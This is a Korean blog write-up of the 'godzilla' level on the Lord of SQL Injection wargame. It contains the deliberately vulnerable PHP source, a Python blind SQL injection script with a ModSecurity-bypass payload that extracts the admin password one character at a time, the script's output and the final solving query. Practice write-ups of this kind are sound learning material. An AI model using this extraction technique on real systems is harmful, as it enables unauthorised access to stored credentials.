---
title: "[Lord of SQL Injection] LoS - godzilla 문제풀이"
date: 2019-06-14
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

다음 문제는 `godzilla`이다.
이번 문제는 `Blind SQL Injection`이다.  

<!--more-->

코드는 다음과 같다.  

```php
-----------------------------------------------------------------
query : select id from prob_godzilla where id='' and pw=''
-----------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_godzilla where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) echo "<h2>Hello admin</h2>";
   
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_godzilla where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("godzilla");
  highlight_file(__FILE__);
?>
```

거의 앞의 문제와 동일하지만 이번에는 `admin`의 정확한 `pw`까지 입력해야 문제를 풀 수 있다.
앞의 문제를 풀며 방화벽을 어떻게 우회할 수 있는지 알았으니, 아래와 같이 소스코드를 구현해서 `admin`의 `pw` 값을 알아냈다.  

```python
import requests

flag = ""
length = 0

url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php?id="
session = dict(PHPSESSID = "YOUR SESSION ID")

print "[+] Start"

print "[+] Find length of the password"

for i in range(0, 20):
	try:
		query = url + "-1'<@=1 OR id='admin' and length(pw)=" + str(i) + " OR '&pw=a"
		r = requests.post(query, cookies=session)
	except:
		print "[-] Error occur"
		continue

	if 'Hello admin' in r.text:
		length = i
		break

print "[+] Found length : ", length

print "[+] Find password"

for j in range(1, length + 1):
	for i in range(48, 128):
		try:
			query = url + "-1'<@=1 OR id='admin' and substr(pw, " + str(j) + ", 1)='" + chr(i) + "' OR '&pw=a"
			r = requests.post(query, cookies=session)
		except:
			print "[-] Error occur"
			continue

		if 'Hello admin' in r.text:
			flag += chr(i)
			print "[+] Found " + str(j), ":", flag
			break

print "[+] Found password : ", flag
print "[+] End"
```

먼저 `pw`의 길이를 알아내기 위해 `length()`를, `pw`를 한 글자 씩 알아내기 위해 `substr()`를 사용했다.
그 결과는 아래와 같다.  

```bash
$ python ex.py 
[+] Start
[+] Find length of the password
[+] Found length :  8
[+] Find password
[+] Found 1 : A
[+] Found 2 : A1
[+] Found 3 : A18
[+] Found 4 : A18A
[+] Found 5 : A18A6
[+] Found 6 : A18A6C
[+] Found 7 : A18A6CC
[+] Found 8 : A18A6CC5
[+] Found password :  A18A6CC5
[+] End
```

여태까지의 경험으로 볼 때, 패스워드의 값은 항상 알파벳 소문자였으므로, 나온 결과값을 소문자로 바꾸어 입력하면 문제를 풀 수 있다. 

```plain
?id=admin&pw=a18a6cc5
```

```php
---------------------------------------------------------------------------
query : select id from prob_godzilla where id='admin' and pw='a18a6cc5'
---------------------------------------------------------------------------

Hello admin
GODZILLA Clear!
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_godzilla where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) echo "<h2>Hello admin</h2>";
   
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_godzilla where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("godzilla");
  highlight_file(__FILE__);
?>
```

---

```plain
GODZILLA Clear!!
```